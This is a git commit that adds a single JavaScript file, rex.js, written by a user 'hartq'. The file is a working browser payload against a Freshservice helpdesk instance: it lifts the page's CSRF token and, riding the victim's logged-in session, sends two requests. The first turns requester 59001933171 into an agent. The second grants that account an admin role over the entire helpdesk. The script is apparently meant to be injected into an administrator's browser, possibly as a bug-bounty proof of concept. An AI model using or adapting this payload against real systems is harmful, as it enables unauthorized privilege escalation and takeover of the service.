771d70fcd87340d8a44141fa46e82fc3779ad510
hartq <HartaRanj@proton.me>
2025-12-28 22:20:56 +0400

    Create rex.js

---
+++ rex.js
@@ -0,0 +1,34 @@
+async function sendRequests() {
+    try {
+        // First step call Csrf-Token by create variable and used var name in the headers
+        const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
+
+        // Execute POST request that convert requester ==> Agent 
+        await fetch('https://h1s.freshservice.com/itil/requesters/59001933171/make_agent', {
+            method: 'POST',
+            credentials: 'include',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'X-Csrf-Token': csrfToken
+            },
+            body: '_method=put'
+        });
+
+        // Execute PUT request that convert Agent ==> account admin
+        await fetch('https://h1s.freshservice.com/api/_/agents/59001933171/map_workspace_groups_and_roles', {
+            method: 'PUT',
+            credentials: 'include',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-Csrf-Token': csrfToken
+            },
+            body: `{"observer_of":[],"member_of":[],"roles":[{"role_id":59000223620,"assignment_scope":"entire_helpdesk"}],"workspace_id":1}`
+        });
+
+        console.log('Requests completed successfully');
+    } catch (error) {
+        console.error('Error:', error);
+    }
+}
+
+sendRequests();
